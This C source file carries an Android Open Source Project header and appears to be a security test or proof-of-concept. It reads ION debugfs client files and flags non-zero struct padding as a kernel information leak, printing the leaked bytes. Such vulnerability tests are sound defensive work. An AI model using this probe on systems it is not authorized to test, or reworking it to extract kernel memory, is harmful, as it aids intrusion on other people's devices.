/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
// for syscall
#include <sys/syscall.h>
// for futex
#include <linux/futex.h>
#include <sys/time.h>
// for opendir / readdir
#include <dirent.h>

#define LOG(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) \
  printf(fmt ": %d(%s)\n", ##__VA_ARGS__, errno, strerror(errno))
#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))

static int set_affinity(int num) {
  int ret = 0;
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(num, &mask);
  ret = sched_setaffinity(0, sizeof(cpu_set_t), &mask);
  if (ret == -1) {
    ERR("[-] set affinity failed");
  }
  return ret;
}

struct ion_debugfs_handle_header {
  unsigned int version;
};

struct ion_debugfs_handle_entry {
  unsigned int heap_id;
  size_t size;
  unsigned int flags;
  unsigned int handle_count;
  size_t mapped_size;
};

struct ion_debugfs_handle {
  struct ion_debugfs_handle_header hdr;
  struct ion_debugfs_handle_entry entry;
};

#define TARGET "/sys/kernel/debug/ion/clients/pids/"
int main(int argc, char *argv[]) {
  int i, j, ret, tmpfd;
  ssize_t rr;
  char buf[PAGE_SIZE] = {0}, *p;
  DIR *dir;
  struct dirent *ent;
  struct ion_debugfs_handle_header hdr = {0};
  struct ion_debugfs_handle_entry entry = {0};
  struct ion_debugfs_handle handle = {0};

  /* bind_cpu */
  set_affinity(0);

  dir = opendir(TARGET);
  if (dir == NULL) {
    ERR("[-] opendir %s failed", TARGET);
    return -1;
  }

  while (ent = readdir(dir)) {
    if (ent->d_type != DT_REG) {
      continue;
    }

    memset(buf, 0, PAGE_SIZE);
    snprintf(buf, PAGE_SIZE, "%s%s", TARGET, ent->d_name);

    tmpfd = open(buf, O_RDWR);

    if (tmpfd == -1) {
      continue;
    }

    rr = read(tmpfd, &hdr, sizeof(hdr));

    for (;;) {
      rr = read(tmpfd, &entry, sizeof(entry));
      if (rr == 0) {
        break;
      }

      if (rr != sizeof(entry)) {
        break;
      }

      p = (char *)&entry;
      p += sizeof(int);
      for (i = 0; i < sizeof(int); i++) {
        if(p[i] != 0) {
          printf("INFO DISC FLAG; ");
          for (j = 0; j < sizeof(int); j++) {
            printf("%x", p[j]);
          }
          break;
        }
      }
    }
    close(tmpfd);
  }
  closedir(dir);
  return 0;
}
